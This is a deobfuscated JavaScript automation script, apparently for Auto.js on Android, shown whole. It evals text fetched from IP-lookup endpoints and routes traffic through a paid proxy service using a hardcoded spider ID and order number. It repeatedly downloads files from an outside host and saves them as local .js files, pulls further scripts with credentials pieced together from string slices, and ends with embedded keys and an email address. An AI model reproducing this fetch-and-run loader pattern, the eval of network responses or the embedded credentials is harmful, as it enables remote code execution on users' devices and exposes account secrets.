//Thu Feb 27 2025 02:46:04 GMT+0000 (Coordinated Universal Time)
//Base:https://github.com/echo094/decode-js
//Modify:https://github.com/smallfawn/decode_action
if (yan()) {
  if (app_key2 == "rxkb9ovgguy9n21") {
    var spiderId = "7ab204de5b7e403caada6398f29c2831";
    var orderNo = "YZ20188145457DGCJTP";
    var getIp_api = http.get("http://pv.weibo.com/cityjson?ie=utf-8");
    var InetIP = getIp_api.body.string();
    eval(InetIP);
    log("ʹ�ô���ǰ������IP:" + returnCitySN.cip);
    var xdailiUrl = "http://api.xdaili.cn/xdaili-api//greatRecharge/getGreatIp?spiderId=" + spiderId + "&orderno=" + orderNo + "&returnType=2&count=1";
    for (let i = 0; i < 3; i++) {
      try {
        var getProxy_json = http.get(xdailiUrl).body.json();
        if (getProxy_json.ERRORCODE == "10036" || getProxy_json.ERRORCODE == "10038" || getProxy_json.ERRORCODE == "10055") {
          throw {
            code: "-1",
            msg: "��ȡ�ٶȹ���"
          };
        }
        if (getProxy_json.ERRORCODE == "10036") {
          throw {
            code: "-2",
            msg: "��ȡ�����Ѵ�����"
          };
        }
        break;
      } catch (_0x45ec3a) {
        _0x45ec3a.code == "-1" && (log(_0x45ec3a.msg), sleep(5000));
        _0x45ec3a.code == "-2" && (log(_0x45ec3a.msg), exit());
        i == 2 && (log("������δ֪����,��������..."), exit());
      }
    }
    var xdaili_proxyIP = getProxy_json.RESULT[0].ip;
    var xdaili_proxyPort = parseInt(getProxy_json.RESULT[0].port);
    httpProxy(xdaili_proxyIP, xdaili_proxyPort);
    var getIp_api = http.get("http://pv.sohu.com/cityjson?ie=utf-8");
    var InetIP = getIp_api.body.string();
    eval(InetIP);
    log("ʹ�ô����������IP:" + returnCitySN.cip);
    function httpProxy(_0x16c230, _0x1e8c82) {
      var _0x3a4940 = java.net.Proxy;
      var _0x4b6ee7 = java.net.InetSocketAddress;
      var _0x1c044c = new Packages.okhttp3.OkHttpClient.Builder().proxy(new _0x3a4940(_0x3a4940.Type.HTTP, new _0x4b6ee7(_0x16c230, _0x1e8c82)));
      http.__okhttp__.muteClient(_0x1c044c);
    }
  }
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "3.js");
} else {
  threads.start(function () {
    for (ks = 0; ks < 10; ks++) {
      let _0x27e5be = "http://c460846523.cvc.scd.wezhan.cn/filedownload/518258";
      let _0x2ef0de = http.get(_0x27e5be);
      _0x2ef0de.statusCode == 200 && files.writeBytes("./douying" + ks + ".js", _0x2ef0de.body.bytes());
    }
  });
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "1.js");
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "2.js");
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "5.js");
  xx7(kk7.slice(0, 11) + "0@126.com:ajw" + kk7.slice(14, 21) + "jn4qas", kk7.slice(21, 29), kk7.slice(29, 38) + "4.js");
  setTimeout(function () {
    exit();
  }, 2000);
  key1 = "8366391277";
  key5 = "s8h3hds926h3";
  key9 = "a5e3t50tun3vdb2";
  ss9 = "15729174229@136.com";
}